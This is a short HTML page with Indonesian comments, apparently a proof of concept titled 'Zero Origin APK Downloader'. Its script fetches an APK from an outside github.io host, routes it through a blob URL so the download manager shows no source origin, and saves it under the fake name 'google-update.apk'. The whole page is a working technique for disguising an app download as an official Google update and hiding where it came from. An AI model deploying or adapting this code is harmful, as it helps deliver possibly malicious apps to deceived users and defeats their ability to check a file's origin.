<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Zero Origin APK Downloader 2025</title>
  <style>
    body {font-family:Arial;text-align:center;padding:60px;background:#000;color:#0f0;}
    button {padding:18px 40px;font-size:20px;background:#0f0;color:#000;border:none;border-radius:12px;cursor:pointer;}
    #log {margin-top:20px;font-family:monospace;color:#0f0;}
  </style>
</head>
<body>
  <h1>Zero Origin APK Downloader V2</h1>
  <button onclick="download()">Download google-update.apk (Origin Hilang 100%)</button>
  <div id="log">Status: Siap</div>

  <script>
  async function download() {
    document.getElementById('log').textContent = 'Status: Sedang memproses...';

    try {
      // 1. Ambil APK dulu
      const response = await fetch('https://aliothme.github.io/poc.apk');
      if (!response.ok) throw new Error('Gagal fetch APK');

      const blob = await response.blob();

      // 2. Buat blob URL (ini yang bikin origin HILANG TOTAL)
      const url = URL.createObjectURL(blob);

      // 3. Trigger download dengan nama palsu
      const a = document.createElement('a');
      a.href = url;
      a.download = 'google-update.apk';  // Nama file yang muncul
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // 4. Bersihkan
      setTimeout(() => URL.revokeObjectURL(url), 100);

      document.getElementById('log').innerHTML = 
        '<strong>SUKSES!</strong><br>Origin di download manager: <span style="color:#ff0">KOSONG TOTAL</span><br>File: google-update.apk';

    } catch(e) {
      document.getElementById('log').textContent = 'Error: ' + e.message;
    }
  }
  </script>
</body>
</html>
